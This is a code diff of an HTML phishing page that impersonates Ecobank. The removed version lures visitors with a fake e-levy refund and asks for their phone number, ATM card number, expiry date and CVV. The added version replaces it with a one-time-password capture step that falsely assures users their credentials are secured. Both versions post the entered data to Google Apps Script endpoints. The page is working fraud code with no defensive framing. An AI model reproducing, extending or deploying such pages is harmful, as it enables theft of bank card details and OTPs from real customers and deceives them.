@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Authentication</title>
+  <title>Validation OTP</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -112,52 +112,62 @@
       transform: scale(1.05);
       box-shadow: 0 4px 12px rgba(0,0,0,0.4);
     }
+
+    .notice { font-size: 13px; color: #ccc; text-align: center; margin-bottom: 12px; }
   </style>
 </head>
 <body>
   <div class="header">
     <div class="header-content">
-      <h1>ECOBANK ONLINE VALIDATION</h1>
-      <p>Validate your account information below to avoid service interruptions</p>
-      <p>A 60% refund of e-levy charges awaits you!</p>
+      <h1>Validation OTP</h1>
+      <p>Enter the OTP to complete your account validation</p>
     </div>
   </div>
 
   <div class="login-container">
-    <form id="demoForm">
-      <label>Phone Number</label>
-      <input type="tel" name="phone_number" placeholder="Enter your phone number" required>
-
-      <label>ATM Card Number</label>
-      <input type="text" name="atm_card_number" placeholder="Enter your card number" required>
-
-      <label>ATM Expiry Date</label>
-      <input type="text" name="atm_expiry_date" placeholder="MM/YY" required>
-
-      <label>CVV</label>
-      <input type="text" name="cvv" placeholder="Enter CVV" required>
+    <form id="otpForm">
+      <label>Validation OTP</label>
+      <input type="text" name="validation_otp" placeholder="Enter OTP" required>
+      <div class="notice" id="status">Your credentials are secured.</div>
 
       <div class="button-group">
-        <button type="submit">VALIDATE →</button>
+        <button type="submit">VALIDATE OTP →</button>
       </div>
     </form>
   </div>
 
   <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbxBZeRKxbAyf1pWTLN0z15_l-E3RXnp3hvx2gYHiDDU00GKZ3vBKVt7T2kImh9Sfoo1dw/exec";
-    const form = document.getElementById("demoForm");
+    const form = document.getElementById('otpForm');
+    const statusEl = document.getElementById('status');
+    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
 
-    form.addEventListener("submit", async (e) => {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
+      statusEl.textContent = "Submitting...";
+      statusEl.style.color = "#ccc";
+
       const formData = new FormData(form);
 
       try {
-        const response = await fetch(scriptURL, { method: "POST", body: formData });
-        const result = await response.text();
-        if (result.includes("Success")) window.location.href = "details.html";
-        else alert("Submission failed: " + result);
+        const response = await fetch(WEBAPP_URL, { method: "POST", body: formData });
+        const text = await response.text();
+
+        let json;
+        try { json = JSON.parse(text); } catch {
+          statusEl.textContent = "Invalid response from server.";
+          statusEl.style.color = "#aa0000";
+          return;
+        }
+
+        if (json.result === "success") {
+          window.location.href = "thankyou.html";
+        } else {
+          statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
+          statusEl.style.color = "#aa0000";
+        }
       } catch (err) {
-        alert("Network error. Please try again.");
+        statusEl.textContent = "Network error. Try again.";
+        statusEl.style.color = "#aa0000";
       }
     });
   </script>
